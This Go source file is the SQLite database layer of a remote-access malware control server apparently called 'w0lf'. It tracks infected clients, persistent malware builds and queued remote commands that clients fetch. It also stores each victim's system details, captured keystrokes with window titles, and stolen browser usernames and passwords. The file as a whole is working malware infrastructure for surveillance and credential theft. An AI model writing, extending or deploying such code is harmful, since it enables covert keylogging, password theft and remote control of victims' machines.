package database

import (
	"database/sql"
	"fmt"
	"server/common"
	"strconv"
	"sync"
	"time"

	_ "modernc.org/sqlite"
)

var (
	instance *Database
	once     sync.Once
	dbMutex  sync.Mutex
)

type Database struct {
	db *sql.DB
}

type Client struct {
	ClientID   string `json:"clientID"`
	ClientName string `json:"clientName"`
	OS         string `json:"os"`
	Hostname   string `json:"hostname"`
	IP         string `json:"ip"`
	BuildID    string `json:"buildID"`
	ReceivedAt int64  `json:"receivedAt"`
	LastSeen   int64  `json:"lastSeen"`
}

type Build struct {
	BuildID     string
	OS          string
	Arch        string
	Persistence bool
	CreatedAt   int64
}

type Command struct {
	ClientID  string
	Command   string
	Status    string
	CreatedAt int64
}

/*func GetDatabase() *Database {
	once.Do(func() {
		db, err := sql.Open("sqlite", "../cmd/w0lf.db")
		if err != nil {
			fmt.Println("Failed to open database: %v", err)
			return
		}
		instance = &Database{db: db}
	})
	return instance
}*/

func GetDatabase() *Database {
	// If instance already exists, return it directly
	if instance != nil && instance.db != nil {
		// Check if connection is open
		if err := instance.db.Ping(); err == nil {
			return instance
		}
	}

	// Otherwise, create a new connection
	dbMutex.Lock()
	defer dbMutex.Unlock()

	// Check again under lock (double-check locking)
	if instance != nil && instance.db != nil {
		if err := instance.db.Ping(); err == nil {
			return instance
		}
	}

	db, err := sql.Open("sqlite", "../cmd/w0lf.db")
	if err != nil {
		fmt.Printf("Failed to open database: %v\n", err)
		return nil
	}

	// Change SQLite journal behavior
	_, err = db.Exec("PRAGMA journal_mode=WAL;")
	if err != nil {
		fmt.Printf("Failed to set journal mode: %v\n", err)
	}

	// Change synchronization mode
	_, err = db.Exec("PRAGMA synchronous=NORMAL;")
	if err != nil {
		fmt.Printf("Failed to set synchronous mode: %v\n", err)
	}

	// Connection pool settings
	db.SetMaxOpenConns(1)
	db.SetMaxIdleConns(1)
	db.SetConnMaxLifetime(0) // Unlimited

	instance = &Database{db: db}
	return instance
}

func New(dbPath string) (*Database, error) {
	db, err := sql.Open("sqlite", dbPath)
	if err != nil {
		return nil, fmt.Errorf("database could not be opened: %v", err)
	}

	if err := db.Ping(); err != nil {
		return nil, fmt.Errorf("database connection error: %v", err)
	}

	// Change SQLite journal behavior
	_, err = db.Exec("PRAGMA journal_mode=WAL;")
	if err != nil {
		fmt.Printf("Failed to set journal mode: %v\n", err)
	}

	// Change synchronization mode
	_, err = db.Exec("PRAGMA synchronous=NORMAL;")
	if err != nil {
		fmt.Printf("Failed to set synchronous mode: %v\n", err)
	}

	// Connection pool settings
	db.SetMaxOpenConns(1)
	db.SetMaxIdleConns(1)
	db.SetConnMaxLifetime(0) // Unlimited

	database := &Database{
		db: db,
	}

	if err := database.initialize(); err != nil {
		return nil, fmt.Errorf("database initialization error: %v", err)
	}

	return database, nil
}

func (d *Database) initialize() error {
	query := `
	CREATE TABLE IF NOT EXISTS clients (
		clientID TEXT PRIMARY KEY,
		clientName TEXT,
		os TEXT,
		hostname TEXT,
		ip TEXT,
		buildID TEXT,
		receivedAt INTEGER,
		lastSeen INTEGER
	);

	CREATE TABLE IF NOT EXISTS builds (
        buildID TEXT PRIMARY KEY,
        os TEXT NOT NULL,
		arch TEXT NOT NULL,
        persistence BOOLEAN NOT NULL,
        createdAt INTEGER NOT NULL
    );

	CREATE TABLE IF NOT EXISTS commands (
        clientID TEXT PRIMARY KEY,
        command TEXT NOT NULL,
        status TEXT NOT NULL,
        createdAt INTEGER NOT NULL
    );

	CREATE TABLE IF NOT EXISTS systeminfo (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		clientID TEXT NOT NULL,
		hostname TEXT,
		username TEXT,
		os TEXT,
		home_dir TEXT,
		shell TEXT,
		cpu_info TEXT,
		memory_info TEXT,
		disk_info TEXT,
		network_info TEXT,
		receivedAt INTEGER,
		FOREIGN KEY (clientID) REFERENCES clients(clientID)
	);

	CREATE TABLE IF NOT EXISTS keylogs (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		clientID TEXT NOT NULL,
		key TEXT,
		window TEXT,
		time INTEGER,
		state TEXT,
		receivedAt INTEGER,
		FOREIGN KEY (clientID) REFERENCES clients(clientID) ON DELETE CASCADE
	);

	CREATE TABLE IF NOT EXISTS uploading (
		id INTEGER PRIMARY KEY AUTOINCREMENT,
		filename TEXT NOT NULL,
		hash TEXT NOT NULL UNIQUE,
		received_at INTEGER
	);
	`

	if _, err := d.db.Exec(query); err != nil {
		return fmt.Errorf("table creation error: %v", err)
	}

	return nil
}

func (d *Database) AddClient(client common.ClientDB) error {
	query := `
    INSERT INTO clients (clientID, clientName, os, hostname, ip, buildID, receivedAt, lastSeen)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?)
    ON CONFLICT(clientID) DO NOTHING
	`

	_, err := d.db.Exec(query,
		client.ClientID, "", client.OS, client.Hostname, client.IP,
		client.BuildID, client.ReceivedAt, client.LastSeen)

	if err != nil {
		return fmt.Errorf("client could not be added: %v", err)
	}

	return nil
}

func (d *Database) AddBuild(build common.Build) error {

	_, err := d.db.Exec(`
        INSERT INTO builds (buildID, os, arch, persistence, createdAt)
        VALUES (?, ?, ?, ?, ?)`,
		build.BuildID, build.OS, build.Arch, build.Persistence, build.CreatedAt)
	return err
}

func (d *Database) ListBuilds() ([]Build, error) {

	rows, err := d.db.Query(`
        SELECT buildID, os, arch, persistence, createdAt
        FROM builds
        ORDER BY createdAt DESC
    `)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var builds []Build
	for rows.Next() {
		var build Build
		err := rows.Scan(
			&build.BuildID,
			&build.OS,
			&build.Arch,
			&build.Persistence,
			&build.CreatedAt,
		)
		if err != nil {
			return nil, err
		}
		builds = append(builds, build)
	}

	return builds, nil
}

func (d *Database) GetClient(clientID string) (*Client, error) {
	var client Client
	err := d.db.QueryRow(`
        SELECT clientID, clientName, os, hostname, ip, buildID, receivedAt, lastSeen 
        FROM clients 
        WHERE clientID = ?`, clientID).Scan(
		&client.ClientID,
		&client.ClientName,
		&client.OS,
		&client.Hostname,
		&client.IP,
		&client.BuildID,
		&client.ReceivedAt,
		&client.LastSeen)

	if err != nil {
		return nil, fmt.Errorf("client not found: %v", err)
	}

	return &client, nil
}

func (d *Database) GetClientOS(clientID string) (string, error) {
	var os string
	var osType string
	err := d.db.QueryRow(`
        SELECT os 
        FROM clients 
        WHERE clientID = ?`, clientID).Scan(
		&os,
	)

	if err != nil {
		return "", fmt.Errorf("client not found: %v", err)
	}

	if os == "windows" {
		osType = "windows"
	} else if os == "darwin" {
		osType = "darwin"
	} else {
		osType = "linux"
	}

	return osType, nil
}

func (d *Database) ListClients() ([]Client, error) {
	var clients []Client

	rows, err := d.db.Query(`
        SELECT clientID, clientName, os, hostname, ip, buildID, receivedAt, lastSeen
        FROM clients`)
	if err != nil {
		return nil, fmt.Errorf("error querying clients: %v", err)
	}
	defer rows.Close()

	for rows.Next() {
		var client Client
		err := rows.Scan(
			&client.ClientID,
			&client.ClientName,
			&client.OS,
			&client.Hostname,
			&client.IP,
			&client.BuildID,
			&client.ReceivedAt,
			&client.LastSeen,
		)
		if err != nil {
			return nil, fmt.Errorf("error scanning client: %v", err)
		}
		clients = append(clients, client)
	}

	if err = rows.Err(); err != nil {
		return nil, fmt.Errorf("error reading client data: %v", err)
	}

	return clients, nil
}

func (d *Database) UpdateClientLastSeen(clientID string, timestamp int64) error {
	_, err := d.db.Exec(`
        UPDATE clients 
        SET lastSeen = ? 
        WHERE clientID = ?`,
		timestamp, clientID)

	if err != nil {
		return fmt.Errorf("last seen could not be updated: %v", err)
	}

	return nil
}

func (d *Database) GetCommand(clientID string) (string, error) {

	client, err := d.GetClient(clientID)
	if err != nil {
		return "", err
	}

	if client.ClientID != "" && client.ClientID == clientID {
		now := time.Now().Unix()
		err := d.UpdateClientLastSeen(client.ClientID, now)
		if err != nil {
			return "", err
		}

		var command Command

		// First get the command
		err = d.db.QueryRow(`
            SELECT command 
            FROM commands 
            WHERE clientID = ? AND status != 'success' 
            LIMIT 1`, clientID).Scan(&command.Command)

		if err != nil {
			if err == sql.ErrNoRows {
				return "", nil
			}
			return "", err
		}

		// Then update the status
		_, err = d.db.Exec(`
            UPDATE commands 
            SET status = 'success' 
            WHERE clientID = ? AND status != 'success'`, clientID)

		if err != nil {
			return "", err
		}

		// Last delete the command
		_, err = d.db.Exec(`
            DELETE FROM commands 
            WHERE clientID = ? AND status = 'success'`, clientID)

		if err != nil {
			return "", err
		}

		return command.Command, nil
	}

	return "", nil
}

func (d *Database) GetCommand1(clientID string) (string, error) {

	client, _ := d.GetClient(clientID)
	var command Command
	if client.ClientID != "" && client.ClientID == clientID {
		now := time.Now().Unix()
		err := d.UpdateClientLastSeen(client.ClientID, now)
		if err != nil {
			return "", err
		}

		/*query := `
		  UPDATE commands
		  SET Status = 'success'
		  WHERE clientID = ? AND Status != 'success'
		  RETURNING Command`*/

		query := `
        WITH updated AS (
            UPDATE commands
            SET Status = 'success'
            WHERE clientID = ? AND Status != 'success'
            RETURNING Command, CreatedAt
        )
        DELETE FROM commands 
        WHERE clientID = ? AND Status = 'success';`

		err = d.db.QueryRow(query, clientID).Scan(&command.Command, &command.CreatedAt)
		if err != nil {
			if err == sql.ErrNoRows {
				return "", nil
			}
			return "", err
		}
	}
	fmt.Println("command: ", command.Command)
	return command.Command, nil
}

func (d *Database) SetCommand(clientID string, command string) error {
	_, err := d.db.Exec(`
        INSERT INTO commands (clientID, command, status, createdAt)
        VALUES (?, ?, ?, ?)
        ON CONFLICT(clientID) DO UPDATE SET command = ?
    `, clientID, command, "pending", time.Now().Unix(), command)
	if err != nil {
		return fmt.Errorf("command could not be set: %v", err)
	}

	return nil
}

func (d *Database) ClearCommands() error {
	_, err := d.db.Exec("DELETE FROM commands")
	if err != nil {
		return fmt.Errorf("commands table could not be cleared: %v", err)
	}
	return nil
}

func (d *Database) Close() error {
	return d.db.Close()
}

func (d *Database) SaveUploading(filename string, hash string) error {
	_, err := d.db.Exec("INSERT INTO uploading (filename, hash) VALUES (?, ?)", filename, hash)
	if err != nil {
		return fmt.Errorf("uploading could not be saved: %v", err)
	}
	return nil
}

func (d *Database) GetUploadingByFilename(filename string) (string, error) {
	var hash string
	err := d.db.QueryRow("SELECT hash FROM uploading WHERE filename = ?", filename).Scan(&hash)
	if err != nil {
		return "", err
	}
	return hash, nil
}

// GetUploadingByHash returns the file name based on the hash value
func (d *Database) GetUploadingByHash(hash string) (string, error) {
	var filename string
	err := d.db.QueryRow("SELECT filename FROM uploading WHERE hash = ?", hash).Scan(&filename)
	if err != nil {
		return "", err
	}
	return filename, nil
}

// ListUploading lists all upload files
func (d *Database) ListUploading() ([]map[string]string, error) {
	rows, err := d.db.Query("SELECT id, filename, hash, received_at FROM uploading ORDER BY id DESC")
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var result []map[string]string
	for rows.Next() {
		var id int
		var filename, hash, receivedAt string
		if err := rows.Scan(&id, &filename, &hash, &receivedAt); err != nil {
			return nil, err
		}
		result = append(result, map[string]string{
			"id":          strconv.Itoa(id),
			"filename":    filename,
			"hash":        hash,
			"received_at": receivedAt,
		})
	}
	return result, nil
}

func (d *Database) SaveSystemInfo(clientID string, info common.SystemInfo) error {
	now := time.Now().Unix()

	// New record
	_, err := d.db.Exec(`
            INSERT INTO systeminfo (
                clientID, 
                hostname, 
                username, 
                os, 
                home_dir, 
                shell, 
                cpu_info, 
                memory_info, 
                disk_info, 
                network_info, 
                receivedAt
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        `,
		clientID,
		info.Hostname,
		info.Username,
		info.OS,
		info.HomeDir,
		info.Shell,
		info.CPUInfo,
		info.MemoryInfo,
		info.DiskInfo,
		info.NetworkInfo,
		now,
	)

	if err != nil {
		return fmt.Errorf("systeminfo could not be saved: %v", err)
	}

	return nil
}

func (d *Database) SaveBrowserData(dataList []common.BrowserData) error {
	if len(dataList) == 0 {
		return nil
	}

	now := time.Now().Unix()

	tx, err := d.db.Begin()
	if err != nil {
		return fmt.Errorf("transaction could not be started: %v", err)
	}

	stmt, err := tx.Prepare(`
        INSERT INTO browser (
            clientID, 
            browser, 
            data_type, 
            url, 
            title, 
            username, 
            password, 
            value, 
            date, 
            timestamp
        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `)
	if err != nil {
		tx.Rollback()
		return fmt.Errorf("prepared statement could not be created: %v", err)
	}
	defer stmt.Close()

	for _, data := range dataList {
		_, err := stmt.Exec(
			data.ClientID,
			data.Browser,
			data.DataType,
			data.URL,
			data.Title,
			data.Username,
			data.Password,
			data.Value,
			data.Date,
			now,
		)
		if err != nil {
			tx.Rollback()
			return fmt.Errorf("browser data could not be added: %v", err)
		}
	}

	if err := tx.Commit(); err != nil {
		return fmt.Errorf("transaction could not be committed: %v", err)
	}

	return nil
}

func (d *Database) SaveKeyLogs(logs []common.KeyLogData) error {
	if len(logs) == 0 {
		return nil
	}

	now := time.Now().Unix()

	tx, err := d.db.Begin()
	if err != nil {
		return fmt.Errorf("transaction could not be started: %v", err)
	}

	stmt, err := tx.Prepare(`
        INSERT INTO keylogs (
            clientID,
            key,
            window,
            time,
            state,
            receivedAt
        ) VALUES (?, ?, ?, ?, ?, ?)
    `)
	if err != nil {
		tx.Rollback()
		return fmt.Errorf("prepared statement could not be created: %v", err)
	}
	defer stmt.Close()

	for _, log := range logs {
		_, err := stmt.Exec(
			log.ClientID,
			log.Key,
			log.Window,
			log.Time.Unix(),
			log.KeyState,
			now,
		)
		if err != nil {
			tx.Rollback()
			return fmt.Errorf("keylog data could not be added: %v", err)
		}
	}

	if err := tx.Commit(); err != nil {
		return fmt.Errorf("transaction could not be committed: %v", err)
	}

	return nil
}

func (d *Database) GetSystemInfo(clientID string) (common.ShowSystemInfo, error) {
	query := `
        SELECT clientID, hostname, username, os, home_dir, shell, cpu_info, memory_info, disk_info, network_info, receivedAt
        FROM systeminfo
        WHERE clientID = ?
        ORDER BY receivedAt DESC
        LIMIT 1
    `

	var info common.ShowSystemInfo
	err := d.db.QueryRow(query, clientID).Scan(
		&info.ClientID,
		&info.Hostname,
		&info.Username,
		&info.OS,
		&info.HomeDir,
		&info.Shell,
		&info.CPUInfo,
		&info.MemoryInfo,
		&info.DiskInfo,
		&info.NetworkInfo,
		&info.ReceivedAt,
	)

	if err != nil {
		if err == sql.ErrNoRows {
			return common.ShowSystemInfo{}, fmt.Errorf("system information not found for this client")
		}
		return common.ShowSystemInfo{}, fmt.Errorf("system information query error: %v", err)
	}

	return info, nil
}

func (d *Database) GetBrowserData(clientID string) ([]common.BrowserData, error) {
	query := `
        SELECT clientID, browser, data_type, url, title, username, password, value, date, timestamp
        FROM browser
        WHERE clientID = ?
        ORDER BY timestamp DESC
    `

	rows, err := d.db.Query(query, clientID)
	if err != nil {
		return nil, fmt.Errorf("browser data query error: %v", err)
	}
	defer rows.Close()

	var browserDataList []common.BrowserData
	for rows.Next() {
		var data common.BrowserData

		err := rows.Scan(
			&data.ClientID,
			&data.Browser,
			&data.DataType,
			&data.URL,
			&data.Title,
			&data.Username,
			&data.Password,
			&data.Value,
			&data.Date,
			&data.Timestamp,
		)

		if err != nil {
			return nil, fmt.Errorf("browser data read error: %v", err)
		}

		browserDataList = append(browserDataList, data)
	}

	return browserDataList, nil
}

func (d *Database) GetKeylogs(clientID string) ([]common.KeyLogData, error) {
	query := `
        SELECT key, window, time, state
        FROM keylogs
        WHERE clientID = ?
        ORDER BY time DESC
        LIMIT 100
    `

	rows, err := d.db.Query(query, clientID)
	if err != nil {
		return nil, fmt.Errorf("keylog data query error: %v", err)
	}
	defer rows.Close()

	var logs []common.KeyLogData

	for rows.Next() {
		var log common.KeyLogData
		var timestamp int64

		if err := rows.Scan(&log.Key, &log.Window, &timestamp, &log.KeyState); err != nil {
			return nil, fmt.Errorf("keylog data parsing error: %v", err)
		}

		log.ClientID = clientID
		log.Time = time.Unix(timestamp, 0)
		logs = append(logs, log)
	}

	if err := rows.Err(); err != nil {
		return nil, fmt.Errorf("error in data rows: %v", err)
	}

	return logs, nil
}

// UpdateClientName updates the name for the specified client ID
func (db *Database) UpdateClientName(clientID, name string) error {
	_, err := db.db.Exec("UPDATE clients SET clientName = ? WHERE clientID = ?", name, clientID)
	return err
}
